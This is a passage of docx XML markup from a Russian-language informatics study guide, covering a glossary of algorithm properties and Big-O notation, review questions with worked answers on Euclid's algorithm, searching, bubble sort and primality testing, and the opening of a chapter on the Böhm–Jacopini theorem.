      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Конечность</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — алгоритм завершается за конечное число шагов.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Массовость</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — алгоритм решает класс задач, а не одну конкретную.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Результативность</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — алгоритм даёт результат (или сообщает о невозможности).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Исполнитель</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — тот, кто выполняет алгоритм (человек, компьютер, робот).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>СКИ (Система Команд Исполнителя)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — набор элементарных действий, которые исполнитель умеет выполнять.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Словесный способ описания</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — описание алгоритма на естественном языке.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Блок-схема</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — графическое представление алгоритма в виде блоков и стрелок.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Псевдокод</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — промежуточный язык между естественным языком и программированием.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Программный код</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — алгоритм, записанный на языке программирования.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Алгоритм Евклида</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — алгоритм нахождения НОД двух чисел.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Линейный поиск</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — последовательная проверка всех элементов массива.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Бинарный поиск</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — поиск в отсортированном массиве методом деления пополам.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Сортировка пузырьком (Bubble Sort)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — простой алгоритм сортировки сравнением соседних элементов.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Временная сложность</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — количество операций, выполняемых алгоритмом.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пространственная сложность</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — количество памяти, используемой алгоритмом.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>O-большое (Big-O)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — нотация для оценки сложности алгоритма.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>O(1)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — константная сложность (не зависит от размера входных данных).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>O(log n)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — логарифмическая сложность (область задачи уменьшается вдвое на каждом шаге).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>O(n)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — линейная сложность (время пропорционально размеру данных).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>O(n²)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — квадратичная сложность (два вложенных цикла).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>O(2ⁿ)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — экспоненциальная сложность (катастрофически медленно).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Контрольные вопросы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Теоретические:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Что такое алгоритм? Дайте определение.**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   _Подсказка: конечная последовательность чётко определённых действий для решения задачи._</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Назовите 5 свойств алгоритма. Объясните каждое.**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   _Подсказка: Д-Д-К-М-Р (дискретность, детерминированность, конечность, массовость, результативность)._</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Что такое СКИ (Система Команд Исполнителя)? Приведите пример.**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   _Подсказка: набор элементарных действий исполнителя. Пример: СКИ процессора — MOV, ADD, SUB..._</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Перечислите 4 способа описания алгоритмов.**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   _Подсказка: словесный, блок-схема, псевдокод, программный код._</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Чем отличается псевдокод от программного кода?**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   _Подсказка: псевдокод не привязан к конкретному языку программирования, его нельзя запустить на компьютере._</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Что означает нотация O(n)? O(n²)? O(log n)?**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   _Подсказка: линейная сложность, квадратичная, логарифмическая._</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Какой алгоритм быстрее: с O(n) или с O(n²)? Во сколько раз при n = 1000?**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   _Ответ: O(n) быстрее. При n = 1000: O(n) = 1000 операций, O(n²) = 1 000 000 операций. В 1000 раз._</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Почему бинарный поиск быстрее линейного?**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   _Подсказка: бинарный — O(log n), линейный — O(n). Для n = 1024: линейный — 1024 операций, бинарный — 10._</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Практические:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Задача:** Опишите словесно алгоритм заваривания кофе (минимум 5 шагов).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   _Ответ: 1) Взять турку, 2) Насыпать кофе, 3) Налить воду, 4) Поставить на огонь, 5) Дождаться закипания, 6) Снять с огня._</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Задача:** Найдите НОД(36, 48) с помощью алгоритма Евклида. Распишите шаги.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    _Ответ:_</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    ```</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    Шаг 1: a = 36, b = 48 → r = 36 mod 48 = 36 → a = 48, b = 36</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    Шаг 2: a = 48, b = 36 → r = 48 mod 36 = 12 → a = 36, b = 12</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    Шаг 3: a = 36, b = 12 → r = 36 mod 12 = 0 → a = 12, b = 0</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    НОД = 12</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    ```</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Задача:** Найдите максимум в массиве [3, 7, 2, 9, 5] линейным поиском. Распишите шаги.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    _Ответ:_</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    ```</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    Шаг 1: max = 3</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    Шаг 2: 7 &gt; 3 → max = 7</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    Шаг 3: 2 &lt; 7 → max = 7</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    Шаг 4: 9 &gt; 7 → max = 9</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    Шаг 5: 5 &lt; 9 → max = 9</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    Ответ: 9</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    ```</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Задача:** Примените бинарный поиск для нахождения числа 11 в массиве [1, 3, 5, 7, 9, 11, 13, 15]. Распишите шаги.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    _Ответ:_</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    ```</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    Шаг 1: left = 0, right = 7, mid = 3 → A[3] = 7 &lt; 11 → left = 4</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    Шаг 2: left = 4, right = 7, mid = 5 → A[5] = 11 = 11 → найдено, индекс 5</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    ```</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Задача:** Отсортируйте массив [5, 2, 9, 1] методом пузырька. Покажите состояние массива после каждого прохода.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    _Ответ:_</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    ```</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    Исходный: [5, 2, 9, 1]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    Проход 1: [2, 5, 1, 9]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    Проход 2: [2, 1, 5, 9]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    Проход 3: [1, 2, 5, 9]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    ```</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Задача:** Вычислите 3⁴ наивным алгоритмом (умножением 4 раза). Распишите шаги.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    _Ответ:_</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    ```</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    result = 1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    Шаг 1: result = 1 * 3 = 3</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    Шаг 2: result = 3 * 3 = 9</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    Шаг 3: result = 9 * 3 = 27</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    Шаг 4: result = 27 * 3 = 81</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    Ответ: 81</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    ```</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Задача:** Оцените сложность следующего алгоритма:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    ```</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    Для i от 1 до n:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Для j от 1 до n:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Вывести i + j</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    ```</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    _Ответ: O(n²) — два вложенных цикла по n итераций._</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Задача:** Сколько операций выполнит алгоритм с O(log n) для n = 1024?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    _Ответ: log₂(1024) = 10 операций._</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Задача:** Нарисуйте блок-схему алгоритма "Найти минимум из трёх чисел a, b, c".</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    _Подсказка: Сравнить a и b → если a &lt; b, то min = a, иначе min = b → сравнить min и c → если c &lt; min, то min = c → вывести min._</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Задача:** Напишите псевдокод алгоритма "Проверить, является ли число простым".</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    _Ответ:_</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    ```</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    Алгоритм ПростоеЧисло(n):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Если n &lt; 2, вернуть Ложь</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Для i от 2 до √n:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Если n mod i = 0, вернуть Ложь</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Вернуть Истина</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    ```</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Задача:** Опишите словесно алгоритм нахождения суммы всех элементов массива.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    _Ответ:_</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    ```</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Взять массив A размером n</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Установить sum = 0</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Для каждого элемента A[i]:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Прибавить A[i] к sum</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Вернуть sum</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    ```</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Задача:** Какой алгоритм лучше использовать для поиска элемента в **неотсортированном** массиве: линейный или бинарный? Почему?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    _Ответ: Линейный. Бинарный поиск требует отсортированного массива._</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Заключение</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Алгоритмы — это </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>основа программирования</w:t>
      </w:r>
      <w:r>
        <w:t>. Без понимания алгоритмов ты будешь писать код, который работает, но медленно, криво и непонятно.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Главное, что нужно запомнить:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**5 свойств алгоритма:** Дискретность, Детерминированность, Конечность, Массовость, Результативность (Д-Д-К-М-Р).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**4 способа описания:** Словесный, блок-схема, псевдокод, программный код.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Сложность имеет значение:** O(n) лучше, чем O(n²). O(log n) — вообще красота.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Классические алгоритмы:** Евклид (НОД), линейный поиск, бинарный поиск, сортировка пузырьком.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>На экзамене могут попросить:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Назвать свойства алгоритма → Д-Д-К-М-Р</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Нарисовать блок-схему → рисуй овалы, прямоугольники, ромбы</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Оценить сложность → считай вложенные циклы</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Применить алгоритм Евклида → вспоминай mod</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Следующая глава:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 5.2 Основные алгоритмические конструкции (там будем разбирать последовательность, ветвление, циклы)  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Предыдущая глава:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 4.4 Модели решения функциональных задач. Системный подход</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Теперь ты знаешь, что такое алгоритм. В следующей главе мы разберём, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>из каких конструкций</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> строятся все алгоритмы (спойлер: их всего три — последовательность, условие, цикл). Удачи на экзамене!</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Глава 5.2: Основные алгоритмические конструкции</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Введение</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Окей, в прошлой главе мы разобрались, что алгоритм — это </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>пошаговая инструкция</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Но из чего эти шаги состоят? Можно ли как-то </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>систематизировать</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> эту хрень, чтобы не изобретать велосипед каждый раз?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Хорошие новости: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>можно</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. В 1966 году итальянские математики </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Бём и Якопини</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> доказали теорему, которая изменила программирование навсегда (ну или хотя бы упростила жизнь студентам). Они показали, что </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>любой алгоритм</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> можно построить всего из </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>трёх базовых конструкций</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Последовательность** (линейный алгоритм)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Ветвление** (условие)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Цикл** (повторение)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Серьёзно, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>любой</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> алгоритм. Сортировка массива? Три конструкции. Нейросеть? Три конструкции. Управление спутником? Три конструкции (ну и много математики, но суть та же).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Эта глава связана с:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 5.1** (Алгоритм и свойства) — там мы определили алгоритм, здесь показываем из чего он строится</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 4.4** (Модели решения задач) — там были жадные алгоритмы и ДП, здесь — как их реализовать</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 6.1** (Языки программирования) — все языки содержат эти 3 конструкции</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 6.2** (Компиляторы и интерпретаторы) — как эти конструкции превращаются в машинный код</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Зачем это нужно?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Потому что это </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>основа основ</w:t>
      </w:r>
      <w:r>
        <w:t>. Без этих конструкций ты не напишешь ни одной программы. И на экзамене обязательно спросят про ветвления и циклы. Так что читай внимательно.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5.2.1. Теорема Бёма-Якопини</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
